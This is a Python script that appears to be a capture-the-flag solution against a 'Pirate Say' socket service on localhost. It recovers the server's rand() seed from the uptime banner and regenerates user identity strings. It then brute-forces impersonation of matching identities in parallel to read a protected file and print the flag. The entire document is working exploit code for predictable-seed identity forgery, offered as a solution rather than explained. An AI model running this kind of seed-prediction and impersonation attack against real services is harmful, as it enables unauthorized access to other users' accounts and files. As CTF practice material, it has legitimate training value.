import ctypes
import hashlib
import re
import socket
import time
from concurrent.futures import ThreadPoolExecutor

directories = [
    "BlackbeardCove",
    "TreasureIsland",
    "SkullAndBonesReef",
    "DeadMansBay",
    "JollyRogersHarbor",
    "BuccaneerBeach",
    "PirateHideout",
    "CutthroatCreek",
    "SirenShores",
    "CorsairCastle",
    "WickedWaters",
    "MaroonersLagoon",
    "ParrotPerch",
    "RumRunnersRidge",
    "GalleonGraveyard"
]

pirate_adjectives = [
    "Red", "Black", "Silver", "Golden", "Scarlet", "Dark", "White", "Blue", "Rogue", "Stormy",
    "Fearsome", "Mighty", "Brave", "Savage", "Fiery", "Cunning", "Bold", "Fierce", "Grim", "Vengeful",
    "Merciless", "Wild", "Daring", "Stealthy", "Ferocious", "Deadly", "Bloodthirsty", "Cruel", "Relentless", "Treacherous",
    "Wrathful", "Ruthless", "Sinister", "Ghostly", "Iron", "Steel", "Thunderous", "Shadowy", "Mysterious", "Menacing",
    "Dauntless", "Unyielding", "Reckless", "Savvy", "Fearless", "Intrepid", "Grizzled", "Vigilant", "Crafty", "Sly",
    "Swift", "Dreadful", "Gallant", "Heroic", "Legendary", "Wicked", "Terrorizing", "Formidable", "Chaotic", "Brutal",
    "Perilous", "Noble", "Valiant", "Infernal", "Monstrous", "Raging", "Vicious", "Sinful", "Boldhearted", "Ferocious",
    "Indomitable", "Savage", "Dreaded", "Fabled", "Majestic", "Unstoppable", "Ancient", "Stalwart", "Mythic", "Untamed",
    "Mystic", "Prowling", "Doomed", "Forgotten", "Seafaring", "Wandering", "Shadow", "Deepsea", "Stormborn", "Windrider",
    "Tidal", "Maelstrom", "Typhoon", "Tempest", "Harpooner", "Corsair", "Buccaneer", "Seawolf", "SeaSerpent", "Kraken"
]
pirate_nouns = [
    "Beard", "Jack", "Bart", "Pete", "Anne", "Patty", "John", "Hook", "Bill", "Bonny",
    "Morgan", "Davy", "Blackbeard", "Silver", "LongJohn", "Calico", "Rackham", "Teach", "Drake", "Roberts",
    "Lafitte", "Vane", "Flint", "Kidd", "Bartholomew", "Edward", "Mary", "Jane", "Blood", "Cannon",
    "Cutlass", "Sparrow", "Corsair", "Marooner", "SeaDog", "Scallywag", "Buccaneer", "SeaWolf", "Privateer", "Matey",
    "Swashbuckler", "Skull", "Crossbones", "Treasure", "Galleon", "Parrot", "Pistol", "Rum", "Sloop", "Brig",
    "PirateKing", "Siren", "Corsair", "JollyRoger", "Bounty", "Scourge", "SeaSerpent", "Kraken", "Marauder", "Plunder",
    "Loot", "Booty", "BountyHunter", "Mutineer", "Captain", "Quartermaster", "Gunner", "Boatswain", "Lookout", "Sailor",
    "Navigator", "FirstMate", "Shipwright", "PowderMonkey", "CabinBoy", "Deckhand", "Helmsman", "Longboat", "Cannoneer", "Shipmate",
    "PirateQueen", "SeaRover", "SeaRaider", "SeaCaptain", "Freebooter", "Wench", "Swabber", "Harpooner", "SeaWitch", "Buoy",
    "Gangplank", "Mainmast", "Crowsnest", "Forecastle", "Hold", "Broadside", "Bilge", "Grog", "Anchor", "Tide"
]

NUM_ADJECTIVES = len(pirate_adjectives)
NUM_NOUNS = len(pirate_nouns)
IDENTITY_LENGTH = 64

# Load the C standard library
libc = ctypes.CDLL(None)

# Set argument and return types
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int

def generate_identity_string():
    return ''.join(chr(ord('a') + (libc.rand() % 26)) for _ in range(IDENTITY_LENGTH))

def get_unix_time_from_string(date_string):
    # Format of date_string: "2024-07-15 11:35:24"
    return int(time.mktime(time.strptime(date_string, "%Y-%m-%d %H:%M:%S")))

def get_adjective_from_identity(identity_string):
    hash = 5381
    for c in identity_string:
        hash = ((hash << 5) + hash) + ord(c)  # hash * 33 + ord(c)
        hash = hash & 0xFFFFFFFF  # Ensure hash is a 32-bit unsigned integer
    index = hash % NUM_ADJECTIVES
    return pirate_adjectives[index]

def get_noun_from_identity(identity_string):
    hash = 5381
    for c in identity_string:
        hash = ((hash << 5) + hash) + ord(c)  # hash * 33 + ord(c)
        hash = hash & 0xFFFFFFFF  # Ensure hash is a 32-bit unsigned integer
    index = (hash >> 16) % NUM_NOUNS  # Shift to get a different part of the hash
    return pirate_nouns[index]

# Establish a single connection to get the seed and current identity
host = 'localhost'
port = 4444

start_time = time.time()  # Start timing the entire process

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    
    # Receive the initial server message
    def recv_until_prompt(prompt):
        data = b''
        while not data.endswith(prompt):
            data += s.recv(1024)
        return data

    initial_message = recv_until_prompt(b'$ ').decode()
    # Extract the timestamp from the initial message
    match = re.search(r'\(Pirate Say v1.0.0, up since (.+?)\)', initial_message)
    if match:
        seed_string = match.group(1)
        seed = get_unix_time_from_string(seed_string)
    else:
        print("Failed to extract seed from server message")
        exit(1)

    # Get the current identity
    s.sendall(b'identity\n')
    identity_response = recv_until_prompt(b': ').decode()
    s.sendall(b'\n')  # Keeping current identity
    recv_until_prompt(b'$ ')
    current_identity = identity_response.split("\n")[0].split(":")[1].strip()

# Generate all potential identities up to the current one
libc.srand(seed)
potential_identities = []
while True:
    identity_string = generate_identity_string()
    potential_identities.append(identity_string)
    if identity_string == current_identity:
        break

print("Match at offset:", len(potential_identities))

# The target file we're looking for
target_directory = "DeadMansBay"
target_file = "mythic_powder_monkey_found_shipwreck_2017-09-09_2055.private"
target_name = target_file.split('_')[0] + '_' + target_file.split('_')[1]

# Filter potential identities to find matching ones
matching_start_time = time.time()  # Start timing the matching identities process

matching_identities = []
for identity in potential_identities:
    adj = get_adjective_from_identity(identity)
    noun = get_noun_from_identity(identity)
    scammer_name = f"{adj}_{noun}".lower()
    if target_name in scammer_name:
        matching_identities.append(identity)

matching_end_time = time.time()  # End timing the matching identities process

print(f"Number of matching identities: {len(matching_identities)}")
print(f"Time to get number of matching identities: {matching_end_time - matching_start_time:.2f} seconds")

# Define a function to process each identity
def process_identity(identity):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        def recv_until_prompt(prompt):
            data = b''
            while not data.endswith(prompt):
                data += s.recv(1024)
            return data
        
        s.sendall(b'identity\n')
        recv_until_prompt(b': ')
        s.sendall(identity.encode() + b'\n')
        recv_until_prompt(b'$ ')

        s.sendall(f'sail {target_directory}\n'.encode())
        recv_until_prompt(b'$ ')
        s.sendall(f'loot {target_file}\n'.encode())
        response = recv_until_prompt(b'$ ')
        if "Protected with identity hash" in response.decode():
            print("Flag found!")
            print(response.decode())
            return
        print(response.decode())
        s.sendall(b'sail ..\n')
        recv_until_prompt(b'$ ')

# Use ThreadPoolExecutor to parallelize the process_identity function
with ThreadPoolExecutor() as executor:
    executor.map(process_identity, matching_identities)

end_time = time.time()  # End timing the entire process

print(f"Total time: {end_time - start_time:.2f} seconds")
